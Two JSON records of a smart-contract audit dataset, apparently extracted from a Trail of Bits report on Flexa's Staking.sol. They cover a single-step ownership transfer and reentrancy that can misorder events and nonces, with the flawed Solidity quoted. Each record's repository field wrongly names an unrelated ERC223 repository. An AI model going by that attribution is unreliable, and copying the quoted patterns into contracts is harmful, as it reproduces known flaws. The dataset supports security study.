{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-006", "doc_id": "trailofbits_Flexa", "finding_index": 6, "page_start": 19, "title": "setOwnershould be split into two separate functions", "short_summary": null, "description_md": "#### **Description**\n\nsetOwner changes ownership of the contract in a single transaction. If an incorrect newOwnerAddress is provided, ownership may never be recovered. A best practice is to split the ownership into two functions: transfer and accept.\n\nBy splitting the functionality of setOwner into two functions—transferOwnership and acceptOwnership—the original owner will retain owner abilities until the new owner calls acceptOwnership. This will prevent accidental transfer of ownership to an uncontrolled address.\n\n```\n function setOwner ( address newOwnerAddress ) external {\n require (\n msg . sender == _owner,\n \"Only the owner can set the new owner\"\n );\n address oldValue = _owner;\n _owner = newOwnerAddress;\n emit OwnerUpdate (oldValue, _owner);\n }\n```\n\n*Figure 6.1: The* setOwner *function definition.*\n", "full_markdown": "### 6.setOwnershould be split into two separate functions\n\nSeverity: Informational Difficulty: High\n\nType: Access Controls Finding ID: TOB-FLX-006\n\nTarget: Staking.sol\n\n#### **Description**\n\nsetOwner changes ownership of the contract in a single transaction. If an incorrect newOwnerAddress is provided, ownership may never be recovered. A best practice is to split the ownership into two functions: transfer and accept.\n\nBy splitting the functionality of setOwner into two functions—transferOwnership and acceptOwnership—the original owner will retain owner abilities until the new owner calls acceptOwnership. This will prevent accidental transfer of ownership to an uncontrolled address.\n\n```\n function setOwner ( address newOwnerAddress ) external {\n require (\n msg . sender == _owner,\n \"Only the owner can set the new owner\"\n );\n address oldValue = _owner;\n _owner = newOwnerAddress;\n emit OwnerUpdate (oldValue, _owner);\n }\n```\n\n*Figure 6.1: The* setOwner *function definition.*\n\n#### **Exploit Scenario**\n\n- Alice deploys the Staking contract, then decides to change the owner to another address under her control.\n- Subsequently, she enters the new address as the newOwnerAddress, but mistakenly enters the last hex value of the address incorrectly.\n- Upon invocation of setOwner with the malformed input, Alice loses all ownership of the contract.\n\n#### **Recommendation**\n\nShort term, ensure in the off-chain code that the newOwnerAddress is always under control before invocation of setOwner.\n\nLong term, use a two-step process of transferOwnership and acceptOwnership to ensure an address is controllable before confirming ownership transfer.\n", "severity": "Informational", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-FLX-006", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Dexaran/ERC223-token-standard", "org": "Dexaran", "name": "ERC223-token-standard", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-FLX-006", "Target": "Staking.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-007", "doc_id": "trailofbits_Flexa", "finding_index": 7, "page_start": 20, "title": "Reentrancy could cause incorrect information to be emitted", "short_summary": null, "description_md": "#### **Description**\n\nReentrancies on token transfer might trigger the incorrect order of events. The reentrancies require a token with external call capabilities, which is not possible with the current token implementation.\n\nAfter each token transfer, an event is emitted. If the token transfer is made on a contract with external call capabilities (such as [ERC223](https://github.com/Dexaran/ERC223-token-standard) or [ERC777](https://eips.ethereum.org/EIPS/eip-777)), a reentrancy might cause events to be emitted in the wrong order:\n\n```\n bool transferred = myIERC20 (_tokenAddress). transfer (\n toAddress,\n amount\n );\n require (transferred, \"Transfer failed\" );\n emit Withdrawal (\n toAddress,\n amount,\n withdrawalPermissionRootNonce,\n maxAuthorizedAccountNonce\n );\n```\n\n*Figure 7.1: withdraw (Staking.sol#L251-L263).*\n\n```\n bool transferred = myIERC20 (_tokenAddress). transfer (\n depositor,\n amount\n );\n require (transferred, \"Transfer failed\" );\n emit PendingDepositRefund (depositor, amount);\n```\n\n*Figure 7.2: refundPendingDeposit (Staking.sol#L345-L351).*\n\n```\n bool transferred = myIERC20 (_tokenAddress). transfer (\n toAddress,\n```\n\n\n```\n withdrawalAmount\n );\n require (transferred, \"Transfer failed\" );\n emit FallbackWithdrawal (\n toAddress,\n withdrawalAmount\n );\n }\n```\n\n*Figure 7.3: withdrawFallback (Staking.sol#L309-L320).*\n\n```\n bool transferred = myIERC20 (_tokenAddress). transferFrom (\n msg . sender ,\n address ( this ),\n amount\n );\n require (transferred, \"Transfer failed\" );\n depositNonce = ++ _depositNonce;\n _nonceToPendingDeposit[depositNonce].depositor = msg . sender ;\n _nonceToPendingDeposit[depositNonce].amount = amount;\n emit Deposit (\n msg . sender ,\n amount,\n depositNonce\n );\n```\n\n*Figure 7.4: deposit (Staking.sol#L153-L168).*\n\nIn addition, the nonce associated with a deposit might not follow the correct order (Figure 7.4).\n", "full_markdown": "### 7. Reentrancy could cause incorrect information to be emitted\n\nSeverity: Informational Difficulty: Undetermined Type: Data Validation Finding ID: TOB-Flexa-007\n\nTarget: Staking.sol\n\n#### **Description**\n\nReentrancies on token transfer might trigger the incorrect order of events. The reentrancies require a token with external call capabilities, which is not possible with the current token implementation.\n\nAfter each token transfer, an event is emitted. If the token transfer is made on a contract with external call capabilities (such as [ERC223](https://github.com/Dexaran/ERC223-token-standard) or [ERC777](https://eips.ethereum.org/EIPS/eip-777)), a reentrancy might cause events to be emitted in the wrong order:\n\n```\n bool transferred = myIERC20 (_tokenAddress). transfer (\n toAddress,\n amount\n );\n require (transferred, \"Transfer failed\" );\n emit Withdrawal (\n toAddress,\n amount,\n withdrawalPermissionRootNonce,\n maxAuthorizedAccountNonce\n );\n```\n\n*Figure 7.1: withdraw (Staking.sol#L251-L263).*\n\n```\n bool transferred = myIERC20 (_tokenAddress). transfer (\n depositor,\n amount\n );\n require (transferred, \"Transfer failed\" );\n emit PendingDepositRefund (depositor, amount);\n```\n\n*Figure 7.2: refundPendingDeposit (Staking.sol#L345-L351).*\n\n```\n bool transferred = myIERC20 (_tokenAddress). transfer (\n toAddress,\n```\n\n\n```\n withdrawalAmount\n );\n require (transferred, \"Transfer failed\" );\n emit FallbackWithdrawal (\n toAddress,\n withdrawalAmount\n );\n }\n```\n\n*Figure 7.3: withdrawFallback (Staking.sol#L309-L320).*\n\n```\n bool transferred = myIERC20 (_tokenAddress). transferFrom (\n msg . sender ,\n address ( this ),\n amount\n );\n require (transferred, \"Transfer failed\" );\n depositNonce = ++ _depositNonce;\n _nonceToPendingDeposit[depositNonce].depositor = msg . sender ;\n _nonceToPendingDeposit[depositNonce].amount = amount;\n emit Deposit (\n msg . sender ,\n amount,\n depositNonce\n );\n```\n\n*Figure 7.4: deposit (Staking.sol#L153-L168).*\n\nIn addition, the nonce associated with a deposit might not follow the correct order (Figure 7.4).\n\n#### **Exploit Scenario**\n\nStaking is deployed with an ERC777 token. Eve uses the reentrancy to trigger incorrect events and confuse the staking off-chain monitor.\n\n#### **Recommendation**\n\nShort term, use the [Checks-Effects-Interactions](https://solidity.readthedocs.io/en/v0.5.0/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern for all the token interactions (deposit, withdraw, withdrawFallback, refundPendingDeposit).\n\nLong term, continuously run [Slither](https://github.com/trailofbits/slither/) on the codebase or use [crytic.io.](https://cryptic.io/)\n", "severity": "Informational", "difficulty": "Undetermined", "type": "Data Validation", "finding_id": "TOB-Flexa-007", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Dexaran/ERC223-token-standard", "org": "Dexaran", "name": "ERC223-token-standard", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Undetermined", "Type": "Data Validation", "Finding ID": "TOB-Flexa-007", "Target": "Staking.sol"}}
